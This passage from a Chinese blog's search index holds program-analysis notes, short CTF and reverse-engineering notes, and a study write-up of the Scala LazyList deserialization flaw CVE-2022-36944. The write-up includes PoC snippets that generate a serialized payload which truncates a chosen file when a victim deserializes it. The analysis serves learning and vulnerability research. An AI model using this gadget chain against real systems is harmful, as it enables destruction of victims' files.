e_{pardam}.e_{body}$,第一个是参数，第二个是Body\n($\\lambda x.x+1$)3，表示执行这个函数，输出就是4\n\ndesign flow functions\n目标是：判断是否被初始化\n认为未初始化是sound的。都假定未初始化都是1。\n\n\n程序中定义了x,g两个变量\n因为x已经被初始化了，把它从S中除去\n进入方法，所有的x由a替换\ng被初始化\na-g的结果取决于，a和g两个，如果a和g中有一个没被初始化，a就没被初始化，加到S中，否则被出池化\n程序最后出来减去a\n\n红框的内容，对应之前学的为什么要有call–&gt;return的边。\n\n\n因为要传Local variable，在这里也就是传g\n\n如果这里直接是$\\lambda S.S$，它也一定是sound的，你就认为它没初始化\n\n为什么要减去g呢？\n\n首先程序是may analysis，也就是有一条边初始化了，就认为是初始化了，所以merge处是**+**\n那这里减去g就表示现在$\\lambda S.S$里面没有g，那最后有没有g完全由方法p决定，因为结果是+。方法里说定义了就是定义了，没定义就是没定义。\n如果不减，就默认，S中有g，一定会传下去，那就是不准的，因为并不知道会不会传下去。\n\n关键点在于这个Merge的结果是什么。\n\n\nBuild Exploded Supergraph关于must analysis 和 may analysis的理解终极版\n\n\n\nReaching Definitons\nLive avaliable analysis\navaliable expressions analysis\n变量是否初始化分析\n\n\n\nmust&#x2F;may analysis\nmay analysis\nmay analysis\nmust analysis\nmay analysis\n\n\nunsafe的情况\n所有变量都不能到达\n所有变量都不活跃\n所有表达式都可用\n所有变量都未初始化\n\n\nsafe but useful\n所有变量均可到达\n所有变量都活跃\n所有表达式都不可用\n所有变量都初始化\n\n\n目标\n找到未到达的变量，进行替换\n找到不活跃的变量进行替换\n对可用的表达式进行替换\n对未初始化的变量进行替换\n\n\n初始化(对应unsafe)\n0\n0\n1\n0\n\n\n关于sound：\n\n大于目标的就是sound，那目标是找到不活跃的变量，所以sound就是所有的都不活跃。\n程序从unsafe也就是sound向safe分析。\nQ1：第一步是判断是must analysis，还是May analysis\n根据定义判断，有意义和无意义的结果要满足sound，&#x3D;&#x3D;是希望找到尽可能多的safe的结果&#x3D;&#x3D;，根据上面的may analysis view，分析从unsafe –&gt;safe，其实这里可以看出unsafe 就是sound\n\nReaching Definitions：定义是判断$D_i$是否有意义。也就是一条路径如果有意义，没有重新definitions，那就是有意义，所以是may analysis，对于Reaching Definitions，\nLive variables：一条路径用了这个变量，那就是有意义    \n目标是找到不活跃的变量。\n假设所有变量都不活跃。\n\n\navaliable expressions：判断表达式是否可以被替换，也就是如果所有路径都算了，那就可以被替换。所以是must analysis\nconstant propogate：所有路径都是一样的，才是常量，所以是must analysis\n\nQ2：根据must(may) analysis，定义merge处是乘法(加法)\n\nReaching Definitions：加法\nLive variables：加法\navaliable expressions：乘法\nconstan propogate：乘法\n\nQ3：关于初始化什么定义成1，什么定义成0\n其实加法，显然应该全部初始化为0，目标是获得1.\n乘法全部初始化为1,目标是获得0。\n\n为什么红框处是$\\lambda S.S-{g}$，而不是$\\lambda S.S$？\n首先这个流程的最后结果会得到一个集合$\\lambda S.S$，而该集合是未定义变量的集合。这里和之前的May analysis的分析不太一样，我们之前得到的safe结果是活跃的变量的集合(定义的集合)。\n\n按照老师的理解：\n\n由于是may analysis，\n\n如果call返回的结果是未定义，那么$\\lambda S.S$中就会有g，会流出来，由于call-to-return边没有让g流出来，最后会流到下面。\n如果call返回的结果是定义了，也就是g不会流出来，而call-to-return边没有让g流出来，最后就不会流到下面。\n综上，结果正确。\n\n而如果该边是$\\lambda S.S$,最后结果无论怎样都认为g是未定义的，显然结果是不准的。\n\n按照正规我前面总结的表格分析：\n\n由于是may analysis，目标是让定义的变量尽可能的多，所以该边是$\\lambda S.S-{g}$\n\n按照我的理解：\n\n按照正规来说，这里应该定义未初始化的变量为0，初始化的变量为1。\n那么最后获得的集合，其实是一个定义变量的集合。\n也就和上图表示的不一样，上图获得的是一个定义变量的集合。\n\n按照上图定义1和0：\n\n如果按照上图来定义，那应该定义未初始化的变量为1，初始化的变量为0，此时最终获得的是未初始化的变量集合。\n","slug":"软件分析","date":"2023-10-08T02:25:41.000Z","categories_index":"","tags_index":"Program Analysis","author_index":"XyM4ster"},{"id":"280fda85aebd83efe2030df16a32f5ff","title":"bottomupcs","content":"\n  165d50f05814027fb7fe5e4ae8a088d8cabf1ea2d88ccf0f53dc7b0b289f333341828fd88b2557819d802f94103d3ae533a248f976fe4b8635c776fc2c174c3bf94982f99e89821d0b7a0b8248972d15294175d6f52be234cf3fa9cae020470722e187865044c2ad1bbc46e6470ff95e03f8bdf4f8a7b177df17890cc4d7c9daac5071df9ff7f7adeceb8fdd764b5cc14989eac14430c91a4439e4967b927463afedfbf934c9fa3a5700d893337da5687c20c0e7e5a4f43fb1e44ba9f8d69c5fbfae5a88ad5e2aefde68a0ad1422614835e8c434734c29be89aa21136ee50c0fec0858bd6418ef6f5846c32daa9a6352525163cac83dd885efbd0d8a9b58754025df413c147b64b95a2a8682c977706360f96b83b2e56418e4d20c6046555e606c559699afcf8a5528529500461293fe846d5957a8d6dd98208470620df2a898e7e3e2110bb3de430951c7bf3ba4ce56136044450f4e2bd961f917db2a0662365f63b27cabc682548499361299b320e453c749294cef2b2c4a6366cf92ea75c4b4e8d1d0339a29d75808a96a7d065bc10b6d3d822791ac0b584af26b0e2bc09ceefa63903365358803b47b89ea1fd065501ee78e5b39a845afe9e4103b0a48998fe632260f9e2530218730a48fef7125209ad8684e6a5a451f5fd551cde0464fddf10666c3935cdd1f161fae2e2c998c7a577b834266666b555633d86b47a0863d8be6d0106a25f9011bce57e73b60a7de2b297c269090535b85b5435666a3432c4909fce1720c72a740a086c621364a20c655b6e88b9ce99927e3d9103a03c0c5ca5d00e67076892078f93c6bf23b37296c4fdb9a8240ed27e05841a9c129670a49cee62675728b7adb2befc03dedbd8e53ee4f87d0cb57c4393c0507001199a02867d4d756bc8465a98b02f09aa88cd3fb68a03104c3e2b9733c1b97f787b23c5959b9a294ae153e6f23f3bb21cb75c6b71429bbf99e7509c239eba0a5c21f44d6160e0581a6a31cccbc888597f277aa5c39aed7b3767b0f5a0ada7add51e12d9ca45031d20c7df7a6f2e0fe46eac547e6f2dde9b9cc514416aa38114ced28c3440f5ec76f2ab92a850666c24134d43fae00ba0f989f2f39fdbd9d7bd360889aaed8e6ce1fe81a14142b487ca0458de84b3dd9f7de1a0562d3771402a3681332641997c78812820fc741e225623d1d10dfa4ed3c6fb551a7135f5030e1103a82b23763378ef9aaf668cc06c7b9b2c37007a232efff8357325e9ac2d66d78b3ed79e81fa08cad31820c84041b3dc39708ab8fe7529f45f0f7952e69ab879a92cee09693c3d0f12b616fa081ec8b96a1bbe5724767e355b13fbecabef00d53e68354c03042b91fd9444bb9eea0db7d4f7e1a1ae05de6b4187290d162521556de47f2568da915d9e0785d7c0913ff98623e17fedef4fd13b4424ececbb9e44eae73d7e2c422b373a854ec77edf34acf22d884f9a2a53e16793ab7ded37c99c4ab88d2dc766ba3c083cc2cf3a9cc9ca4c0d883dad57d4d7c837f649c940b2c2a50e192118d5403e78e319d876cd6f975131d44d71bd143df36002493c31c32fa1215889f081a08f005e0d8f72f982fc44159dcd700f58e29051ea6ae832de378681ef9655d767c6c013342f6fa38bb0db6da1607f7f16826252cebf59211d8947262b60a16d2dc016f7500dd8547c74e3a865fe64e49ab24eeae1be6eb4424efd2ef42b1407063155579483e6f2ce8927cf4709a4765593f7e61785238bb704dbf51441c93c7767beddd2d2ef94c6acd7f2000e7506aabd313e4ac9506abca9bee854ec5be0041cea84fcc1d97f667f3573ce4a3e5fb2a29ee0884d1a77448642f53f8fbba7d789c483993d8e83bce7e935776d9e0a476ca5be87ecc3c7bceabedc197a4d58297409ccc7a650f087b22f159fa492de09fc516bacd9d51055de02821fdd6a4217698fa9749a1190fb27cbada6eda77f9178e3d68c1e6e675130a0dfb28ae920285d22d723e1a89ef0dc429e74fb7159ed5cb36941998046965cc790e55b821b45f9284378e8dd48bf61961b0b138fe96913bdc17c22bd2911582ed000773bf4abf53a7f48b7a5ea31f634ede159c2df97428dbaf566f4696ae589937808cf58d7c36a820809f613243a619fab91a672384ed2cf4589705f885b61f3a4f4ef3bc7e3c064aa3262347694b8511f92d937dd9df479ccd8bb40f4a686231c9d6d49ba6e5a0cd9424079653ccf568e84b46f684e59f58f161c2e33a710b02a426b79746f8e2244860b791f425dbb9a01f6d28f0f1db88ac0b4be59fcf4d4d4acd40efc224b2009325626b7ba0921cc7ac544b50d9f0148dfd52cfcadd0f675354adeba67ebe74fa2dc7adbfb5c4ea20cb873c6b348518ec087867e470b1a8548c82e4edb71bd52bea9c13ddc5cb99088a34ea020954d8fa5b619f3dc44ac621d58b20c1cbc1e3904ae072939da43c9715574245a34df5580b89fc919d41708079ebaeaffa9fefe675f068a75f3d0b2ea9c98ef11745170794719ac4f49ddd7199078b4dc4c2013f7d92a0325b9cb5f733a99dc67f3ed82febdf433878f1f51a2c44250bdd36cb03a947061026c4a742e6ff9e70516e60799acb4455edfa570b28eae42e5b3192cf9d91c09426029f1810727333d22c6f1ddc3fe96b2d72420a193a4368e0303c20e382aadad4c77f76cfcca85ca0e277522958ac347e98693196bd616a49548a1f43840ca917322c8bff7900c11b7a23891b84c5cc317614b6833ed2bfe077fae9cf2cab54f5b8b531109aeea4237cfeffdc38a9a31ef85d00dde84fbe0f3eff9c7b849ba14b187194442d1645f59bddb4e77d5b224021c267644d7bcd19ef5f3689f76fce6d80\n  \n    \n      \n      \n        Hey, password is required here.\n      \n    \n  \n\n","slug":"bottomupcs","date":"2023-09-20T08:43:17.000Z","categories_index":"","tags_index":"","author_index":"XyM4ster"},{"id":"de8b97b3b30ced078cc1db74c65885b4","title":"Scala_LazyList反序列化漏洞利用","content":"引言\nClick to see more\nSCTF的hello java看了大佬们的wp，完全看不懂。最近的WMCTF，发现很多关于java反序列化的知识,决心要好好学一下java反序列化&#x2F;再回头看这道题，搜索到了大佬的复现博客，赶紧膜拜了一下。\n\n\n参考博客基于LazyList的Scala反序列化漏洞透析(CVE-2022-36944)_小白Lanb0的博客-CSDN博客\n漏洞复现环境GitHub - yarocher&#x2F;lazylist-cve-poc: POC for the CVE-2022-36944 vulnerability exploit\n利用条件\nScala 版本 &lt;2.13.9\n\nScala简介\n这一部分主要是参考上面博客的内容，也有些是我自己的理解\n\nScala运行在Java虚拟机上，并兼容现有的Java程序。Scala源代码被编译成Java字节码，所以它可以运行于JVM之上，并可以调用现有的Java类库\n\nScala可以看成是java的扩展\n\n具有更丰富功能的java\n\n\n匹配器match基本用法// 定义一个值\nval x = ... \n// 使用match对值进行匹配\nx match &#123;\n  // 每个case表示一种匹配情况\n  case 条件1 => 结果1 // 如果x满足条件1，就返回结果1\n  case 条件2 => 结果2 // 如果x满足条件2，就返回结果2\n  ...\n  case _ => 默认结果 // 如果x都不满足上面的条件，就返回默认结果，_表示任意值\n&#125;\n\n\n其他用法// 把match赋值给一个变量\nval result = x match &#123;\n  case 条件1 => 结果1 \n  case 条件2 => 结果2 \n  ...\n&#125;\n\n// 把match作为函数的参数\ndef foo (y: Int) = &#123;\n  println (y)\n&#125;\nfoo (x match &#123;\n  case 条件1 => 结果1 \n  case 条件2 => 结果2 \n  ...\n&#125;)\n\n// 把match作为函数的返回值\ndef bar (z: String): Boolean = z match &#123;\n  case \\\"yes\\\" => true \n  case \\\"no\\\" => false \n  case _ => false \n&#125;\n\n\napply方法当我们用括号传递参数给一个类或者对象时，Scala会自动调用它的apply方法，并把参数传给它。\napply方法定义在伴生对象中// 定义一个类Person，有一个name属性\nclass Person(val name: String)\n\n// 定义一个伴生对象Person，有一个apply方法，接受一个name参数，返回一个Person实例\nobject Person &#123;\n  def apply(name: String) = new Person(name)\n&#125;\n\n// 创建一个Person实例，可以直接用Person(\"Alice\")，而不需要用new Person(\"Alice\")\nval alice = Person(\"Alice\")//相当于Person.apply(\"Alice\")\n\n// 打印alice的name属性，输出Alice\nprintln(alice.name)\n\n\n\n\n这里的Person(“Alice”)是在用括号传递参数，就会调用Person的apply方法\n\napply方法定义在伴生类中object Main &#123;\n\n  def main(args: Array[String]): Unit = &#123;\n\n    class Person(val name: String)&#123;\n      //在类中定义apply方法，输出name\n      def apply() :Unit = println(s\"I am $name\")\n    &#125;\n\n    var p= new Person(\"lanb0\")\n    \n    p()//相当于p.apply()\n    //I am lanb0\n  &#125;\n&#125;\n\n\nUnit是一个特殊的类型，表示不返回任何有用的值。类似于Java中的void类型，Unit在方法或函数不需要返回值时使用\n\n特质traitScala语言中，有一个Scala语言中，有一个重要的概念叫做特质(trait)，它类似于Java语言中的接口，但是比接口更加强大和灵活。\n特质(trait)是一种定义了一组抽象或具体的属性和方法的类型，它可以被类(class)或对象(object)扩展(extends)或混入(mix in)。\n特质可以实现多重继承，也就是说，一个类可以继承多个特质，从而获得所有特质中定义的属性和方法。\n使用trait PersonBody &#123;\n  val height: Int\n&#125;\n\n\n它不能被实例化，像java中的接口\n\n扩展单个特质object Main &#123;\n  trait PersonBody &#123;\n    var height: Int\n  &#125;\n  class Person(name : String) extends PersonBody&#123;\n    override var height: Int = 170\n  &#125;\n  def main(args: Array[String]): Unit = &#123;\n    var person = new Person(\"Cloud\")\n    println(person.height)\n    //170\n  &#125;\n&#125;\n\n重写(实现)属性或方法时，需要使用override关键字来修饰\ntrait的方法声明必须被实现\n扩展多个特质object Main &#123;\n  trait PersonBody &#123;\n    var height: Int\n  &#125;\n  trait PersonHobby&#123;\n    var hobbyGame=\"Honor of King : World\"\n    def showHobby():Unit\n  &#125;\n  trait PersonScore&#123;\n    var math=\"150\"\n    def showScore():Unit\n  &#125;\n  class Person(name : String) extends PersonBody with PersonHobby with PersonScore &#123;\n    override var height: Int = 170\n\n    override def showHobby(): Unit = &#123;\n      println(hobbyGame)\n    &#125;\n\n    override def showScore(): Unit = &#123;\n      println(math)\n    &#125;\n  &#125;\n  def main(args: Array[String]): Unit = &#123;\n    var person = new Person(\"Cloud\")\n    person.showHobby()\n    person.showScore()\n  &#125;\n&#125;\n/*\n输出\nHonor of King : World\n150\n*/\n\n\n跟着多个with，扩展多个特质\n\n自身类型self-typeself-type表示一个类或特质依赖于另一个类型，即它必须和另一个类型混入（mixin）才能被实例化。\n\n假设有一个类Cat\n\nclass Cat &#123;\n  val name: String = \"Tom\"\n  val color: String = \"Gray\"\n  def meow(): Unit = println(\"Meow!\")\n&#125;\n\n\n现在想给猫添加一些新的功能，比如说话、唱歌、跳舞\n\ntrait Talkative &#123;\n  def talk(): Unit\n&#125;\n\ntrait Singer &#123;\n  def sing(): Unit\n&#125;\n\ntrait Dancer &#123;\n  def dance(): Unit\n&#125;\n\n\n但是并不是所有的猫都有，假设只有会说话的猫才能唱歌，也就是唱歌依赖于说话\n\ntrait Talkative &#123;\n  def talk(): Unit\n&#125;\n\ntrait Singer &#123;\n  self: Talkative => // 声明自身类型，表示Singer依赖于Talkative\n  def sing(): Unit = &#123;\n    talk() // 可以直接使用Talkative的成员\n    println(\"La la la...\")\n  &#125;\n&#125;\n\ntrait Dancer &#123;\n  self: Singer => // 声明自身类型，表示Dancer依赖于Singer\n  def dance(): Unit = &#123;\n    sing() // 可以直接使用Singer的成员\n    println(\"Shake shake shake...\")\n  &#125;\n&#125;\n\n此时我再新建对象，也就是给猫混入了这些 特质\nval tom = new Cat with Talkative with Singer with Dancer // 创建一个会说话、唱歌、跳舞的猫\ntom.talk() // 输出：Meow!\ntom.sing() // 输出：Meow! La la la...\ntom.dance() // 输出：Meow! La la la... Shake shake shake...\n\n但是如果给猫没有talkative，而是直接Singer，就会报错\nval jerry = new Cat with Singer // 报错：illegal inheritance; self-type Cat with Singer does not conform to Singer's selftype Singer with Talkative\nval lily = new Cat with Dancer // 报错：illegal inheritance; self-type Cat with Dancer does not conform to Dancer's selftype Dancer with Singer\n\n\n单例对象\nClick to see more\n这一部分是我在看payload生成的源码时，新学的知识\n\n\n单例对象在整个应用程序中只有一个实例，不受类的实例化影响，需要将对象定义放在类的外部，或使用 object 关键字来定义一个独立的对象。\n这里给出了一个单例对象的例子\nobject TestScalaObject &#123;\n val TEST_SYMBOL = \"*\"\n def testMethod(x : String) : String = x\n&#125;\n\n如果我对他用scalac编译，就会产生下面的结果\n\n问题：那这个如果反编译之后呢？\nTestScalaObject.class:\npublic final class TestScalaObject extends java.lang.Object&#123;\n    public static final java.lang.String testMethod(java.lang.String);\n    public static final java.lang.String TEST_SYMBOL();\n&#125;\n\nTestScalaObject$.class:\npublic final class TestScalaObject$ extends java.lang.Object implements scala.ScalaObject&#123;\n    public static final TestScalaObject$ MODULE$;\n    public static &#123;&#125;;\n    public java.lang.String TEST_SYMBOL();\n    public java.lang.String testMethod(java.lang.String);\n&#125;\n\n下面来自GPT:\n\nMODULE$ 的存在是为了保持对象的单例性。由于 Scala 对象是单例的，编译器会在伴生类中创建一个静态的、命名为 MODULE$ 的实例，以确保对象始终是单例的。\n\n这样，就通过 TestScalaObject$.MODULE$ 来访问 TestScalaObject 对象的方法和属性。\n\n在例子中，TestScalaObject$.MODULE$ 实际上是 TestScalaObject 对象的实例。通过它，可以访问 TestScalaObject 中定义的成员，如 TEST_SYMBOL 和 testMethod。\n\n\n总结一下，public static final TestScalaObject$ MODULE$; 是一个静态的、命名为 MODULE$ 的对象，它代表了 TestScalaObject 对象的单例实例。它的存在确保了对象的单例性，并允许你通过它访问对象中定义的成员。\nLazylistlazylist是一种惰性求值的列表，列表中的元素只有在需要的时候才会被计算，而不是一开始就全部计算好。这样可以节省内存和时间，也可以表示无限的序列。\n定义\n\n第一部分用var定义了一个值 LazyState\n()表示是个无参构造器\nLazyList.State[A]是返回值\n这就是个匿名函数：val 一个值：() &#x3D;&gt; return\n\nState,head及tail\nState：\n\nstate:\n\nbitmap$0\n来自StackOverflow\n\nClick to see more\nThat’s where the initialization states for lazy vals are stored. When you access a lazy val (or a nested object, which is equivalent), the compiler uses the bitmap field to determine whether it’s already been evaluated.\n\n\n\n就是确定是否值被计算过了，因为head和tail的序列化和反序列化方法不一样\n\n原理\n首先创建一个具有无限个数字1的Lazylist\n\nval ones = LazyList.continually(1)\n\n\n下面这个表示丢弃前0个元素，使用head方法获取剩余list的第一个元素\n\nprintln(ones.drop(0).head)\n//1\nprintln(ones)\n//LazyList(1, &lt;not computed>)\n\n\n问题1：这里为什么会输出not computed？\n\nhead方法调用state.head\n\n\n\n懒加载的state开始初始化\n\n\n\n这里会调用lazyState方法，就是LazyList构造器中的LazyState()，返回的值是下面的State[A]\n\n\nState[A]调用它的head方法\n\n\nhead方法：返回一个元素，这个元素是当前LazyList计算出的第一个元素。\ntail方法：返回一个新的LazyList，除了第一个元素外，其他元素的集合\n\n\n通过上面的流程可以看出lazylist的本质是不停的用方法取值，而不是一开始所有的1存在内存中\n所以LazyList是Not computed，不是计算好的集合\nLazylist的序列化和反序列化\n它是LazyList的序列化代理，代替LazyList进行序列化和反序列化\n\n这些已经计算出来的元素会以一种紧凑的顺序格式进行序列化，然后跟着未计算出来的元素，它们使用标准的Java序列化方式来存储未计算出来的元素的结构\n\n序列化\n\n\n首先调用默认的wirteObject方法，标准的序列化\n然后判断已经计算过的元素，将么个元素序列化\n遇到没计算过的元素，跳出循环\n序列化一个SerializeEnd，表示计算过的元素序列化完了\n将tail，也就是未计算的元素序列化\n\n反序列化\n\n\n首先调用默认的readObject\n初始化一个缓冲区，存储已经计算出来的元素\n判断是否到了序列化的末尾\n如果没有，就添加到Init缓冲区。asInstanceOf是Scala中的一个类型转换操作符，用于将一个对象强制转换为指定的类型。这里就是转换成A类型\n如果到了末尾，就跳出循环\n\n\n将没有计算出来的元素，类型转换为lazylist\n使用++方法连接init和tail\n\n匿名函数 vs 正常函数匿名函数// 定义一个接受两个整数参数并返回它们的和的匿名函数\nval addition: (Int, Int) => Int = (x, y) => x + y\n\n// 使用匿名函数进行计算\nval result = addition(3, 5)\n\n// 打印结果\nprintln(result) // 输出: 8\n\nval addition: (Int, Int) &#x3D;&gt; Int &#x3D; (x, y) &#x3D;&gt; x + y   \n这里的addition是变量名，并不是函数名\n前面看成一部分，后面堪称一部分，也就是定义一个函数，参数类型为Int Int，返回值为Int\n正常函数def add(x: Int, y: Int): Int = &#123;\n  x + y\n\n\n无参匿名函数scala中的无参匿名函数都会被编译器转换为实现了Function0接口的实例对象\n说人话：无参的函数会实现Function0接口，Function0接口中定义了apply()方法，所以在（)的时候，就会调用Function的apply方法\n\n测试无参匿名函数\n\nclass a&#123;\n   object Main &#123;\n      class test(val func:()=>Int)&#123;\n        def show(): Unit = &#123;\n          func()\n        &#125;\n      &#125;\n\t&#125;\n&#125;\n\n\n\n\n对这个代码点击左键，发现它认为func是Function0的apply方法\n\n\n\n\n也就是无参匿名函数确实实现了Function0接口\n\n\n用scalac进行编译scalac a.scala，生成文件如下\n\n\n\n用javap进行反编译，再次印证，func()方法是Function0类型的\n\n\n漏洞分析\nClick to see more\nLazyList反序列化时会调用一个无参的匿名函数来更新LazyList的状态，这个函数可以被控制。因为Scala中的无参匿名函数都实现了Function0接口，也就是可以给LazyList传一个精心构造的函数，该函数只要实现了Function0接口。\n\n\n首先是ObjectInputStream.readObject方法接受到伪造的序列化字节流之后，尝试反序列化LazyList，进而把控制权转交给SerializationProxy类的readObject方法\n\n这里会执行 ++ 方法，接下来会执行prependedAll方法，且该方法是在trait Seq0ps中定义的，LazyList中重写了该方法\n\n\n跳转到LazyList的prependedAll方法\n\n跟进konwIsEmpty方法\n\n跟进IsEmpty方法：\n\n\n这里的eq是比较state和State.Empty是否指向同一个位置\n\n再跟进state字段，发现跳转到了LazyList定义state处：\n\n\n也就是这里会执行lazyState()，而它就是LazyList构造器中接受的方法，发现它实现了Funciton0接口\n\n\n综上所述，我需要找一个实现了Function0接口的函数，把它替换掉\n漏洞利用匿名函数编译后的形式查看poc中的DefaultProviders，看到这样的代码\n\n问题：这里是在用反射，为什么className是一个看不懂的东西，anonfun是啥玩意？\n\nClick to see more\nScala编译器在编译Scala代码时，会将匿名函数转换成Java字节码，这样就可以在Java虚拟机上运行。\n为了与Java兼容，Scala编译器会为每个匿名函数生成一个类，并给这个类一个特殊的名字，通常是anonfun加上一些数字和符号。这个类名的作用是唯一地标识这个匿名函数，以便在运行时调用。\n\n\n$URLInput:表示ProcessBuilderImpl的内部类\n$$anonfun:表示匿名函数的前缀，表示这是一个自动生成的类。\n$$lessinit$greater:是&lt;init&gt;的转义形式，表示这个匿名函数是在构造器中定义的。\n$1:是匿名函数的序号，表示这是第一个匿名函数。\n问题：为什么要这样构造呢？\n举个例子：\nclass a()&#123;\n  def msg(): String = &#123;\n    return \"i am class a\"\n  &#125;\n&#125;\nclass b (name: =>String)//这里注意冒号和等号之间的空格\nclass c(url:a) extends b(url.msg())\n/**\n这行代码的意思是给c的构造器是a类型 接收参数为url,\n给b的构造器传一个函数url.msg()\n*/\n\n\n\n=&gt; 符号表示这是一个按需求值的参数，也称为 call-by-name 参数。这意味着在实际使用时，stream 参数会被按需求进行求值或调用。\n类b的构造函数接受一个按需传递的参数name，该参数的类型是String。当创建b类的实例时，可以在构造函数中传递一个表达式或函数，而不是一个具体的字符串值。只有当name参数在类的方法或属性中被使用时，它才会被求值。\n\n用scalac进行编译\n\n这个红框框的class表示的是url.msg()这个匿名函数\n\nanonfun：匿名，lessinit$greater表示在构造器中定义的函数\n\n注意：只有b中的参数是传名参数时，才会出现红框框的class\n\n因为传名参数处接受的是一个函数，这个函数可以理解成匿名函数\n\n类比上面的关系，如果这样构造，就会调用父类的构造函数中的内容，也就是下面三个均可以利用\n\npoc源码分析\nClick to see more\n这里利用ProcessBuilderImpl的FileOutput\n\n\n首先创建一个1.txt，用绝对路径\n在Main.java中，添加下面的代码\n\nString fileToTruncate = \"1.txt的路径\";\nPayloadGenerator payloadGenerator = new LazyList(DefaultProviders.FILE_OUTPUT);\nboolean append= false;//清空文件\nbyte[] payload = payloadGenerator.generatePayload(fileToTruncate,append);\nString base64= Base64.getEncoder().encodeToString(payload);\nSystem.out.println(base64);\n\nLazyList(不是scala源码中的，是Poc中自己写的)\n\n获取源码中的LazyList，向里面添加writeObjectSource方法\n\n这里作者说添加了一个方法并设置bitmap为false的原因是：想让在真正的？？？\ngeneratePayload：\n这里首先会apply(args)，function0是一个函数，所以会执行这个函数\n\nClick to see more\nFunciton：apply()\n\n如果有一个 Function&lt;Integer, String&gt; 类型的函数对象，表示接受一个整数参数并返回一个字符串结果，那么可以使用 apply 方法来执行函数的逻辑\n\nFunction&lt;Integer, String> function = num -> \"Result: \" + num;\nString result = function.apply(10);\nSystem.out.println(result);  // 输出：Result: 10\n\n\n\n跳转到了fileOutput\n上面的红框框表示一个接受 Object 数组作为输入，并返回一个 Function0 对象的函数\n问题：这里为什么要传一个ProcessBuilder$.class呢？\n\n查看反编译的结果，发现有一个$outer\n\n是编译器自动生成的方法\n$outer 方法是用于返回外部类（ProcessBuilderImpl.OStreamBuilder，Os）的实例\n\n\n而ProcessBuilder$是ProcessBuilder的伴生对象，也就是Object processBuilder，它继承了ProcessBuilderImple，所以传一个ProcessBuilder$.class\n\nend\n执行结束后，返回的就是new FileOutputStream这个函数，此时的Function0就有了这两个参数\n\n执行createList\n\nClick to see more\n问题：为什么fileName是MODULE？\n\n参照前面的单例对象，这里是用来访问Empty内部的方法和属性\n\n:::details Click to see more\n这里设置bitmap$0为true，前面在lazylist中添加了一个方法，那里设置bitmap为false，作者说是想在序列化开始前，才设置为false。但是其实我不太理解为什么。\n\n\n执行序列化\nnewInstance LazyList的序列化代理serializationProxy，开始序列化\n\nVictim\n在victim中，反序列化刚才的结果，最后发现1.txt中的文件真的被清空了\n\n String data1 = \"前面Base64的结果\";\ndeserialize(Base64.getDecoder().decode(data1));\n\n总结至此，终于完成了Scala LazyList反序列化的漏洞分析，撒花❀。\n克服困难的过程很艰辛也很有趣。\n没有前面师傅的博客，我肯定到现在也不明白，也没有勇气从0开始复现。\n十分感谢参考博客中的小白师傅。\n最后，关于java的反序列化，还有很长的路要走，期待可以多多进步，希望明年这个时候，已经加入了W&amp;M，冲冲冲！\n未尽事宜\n学一下到底怎么用反射去获取类，添加方法\npoc中用了classPool 和反射的工具类 ReflectUtil\n\n\n看一下Github上另一篇关于scala lazylist的分析，修漏洞的\n为什么LazyList中是ArraySeq.class？\n\n","slug":"Scala-LazyList反序列化漏洞利用","date":"2023-09-04T14:20:44.000Z","categories_index":"","tags_index":"漏洞分析,Scala,java","author_index":"XyM4ster"},{"id":"9b333f38efd344acbd675306690f4b47","title":"wmctf","content":"\nBOOT-INF目录：这个目录通常是在使用Spring Boot框架时出现的。它是用于打包可执行的JAR文件的特殊目录。在这个目录下，通常包含了应用程序的所有依赖项（JAR文件）和应用程序的类文件。这些类文件可以包括Spring Boot的启动类、配置类以及其他应用程序的自定义类。\nMETA-INF目录：这个目录是Java项目中的标准目录，用于存放项目的元数据信息。在这个目录下，通常包含了一些重要的配置文件和清单文件。例如，MANIFEST.MF文件通常位于META-INF目录下，其中包含了关于JAR文件的元数据信息，如版本号、作者、依赖关系等。此外，一些框架和库也会在META-INF目录下存放一些特定的配置文件，用于配置其行为和功能。\norg目录：这个目录通常是在Java项目中的包结构下出现的。它是用来组织Java类的包名空间的一部分。在这个目录下，通常包含了项目的Java类文件和包结构。例如，org.example.app是一个典型的包名，其中org是根包，example是中间包，app是具体的包名。\n\n","slug":"wmctf","date":"2023-08-29T05:32:25.000Z","categories_index":"","tags_index":"CTF","author_index":"XyM4ster"},{"id":"0294fa813f0b0ba2157b9babe3fad644","title":"reverse","content":"好书推荐\n恶意代码分析实战\n逆向工程核心原理\n加密和解密\n\n","slug":"reverse","date":"2023-08-12T13:29:43.000Z","categories_index":"","tags_index":"reverse","author_index":"XyM4ster"},{"id":"7873af0b12d3f7cc53b7d970bb6378b1","title":"java反序列化","content":"java序列化和反序列化\nClick to see more\npublic class Animal &#123;\n    private String color;\n\n    public Animal() &#123;//没有无参构造将会报错\n        System.out.println(\"调用 Animal 无参构造\");\n    &#125;\n\n    public Animal(String color) &#123;\n        this.color = color;\n\n        System.out.println(\"调用 Animal 有 color 参数的构造\");\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"Animal&#123;\" +\n                \"color='\" + color + '\\'' +\n                '&#125;';\n    &#125;\n&#125;\n\nimport java.io.Serializable;\n\npublic class BlackCat extends Animal implements Serializable &#123;\n    private static final long serialVersionUID = 1L;\n    private String name;\n\n    public BlackCat() &#123;\n        super();\n        System.out.println(\"调用黑猫的无参构造\");\n    &#125;\n\n    public BlackCat(String color, String name) &#123;\n        super(color);\n        this.name = name;\n        System.out.println(\"调用黑猫有 color 参数的构造\");\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"BlackCat&#123;\" +\n                \"name='\" + name + '\\'' +super.toString() +'\\'' +\n                '&#125;';\n    &#125;\n&#125;\n\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\n\npublic class SuperMain &#123;\n    private static final String FILE_PATH = \"./super.bin\";\n\n    public static void main(String[] args) throws Exception &#123;\n        serializeAnimal();\n        deserializeAnimal();\n    &#125;\n\n    private static void serializeAnimal() throws Exception &#123;\n        BlackCat black = new BlackCat(\"black\", \"我是黑猫\");\n        System.out.println(\"序列化前：\"+black.toString());\n        System.out.println(\"=================开始序列化================\");\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(FILE_PATH));\n        oos.writeObject(black);\n        oos.flush();\n        oos.close();\n      //animal 因为没有实现序列化接口，因此对应的 color 属性就不会被序列化，因此反序列得到的 color 值就为 null\n    &#125;\n\n    private static void deserializeAnimal() throws Exception &#123;\n        System.out.println(\"=================开始反序列化================\");\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FILE_PATH));\n        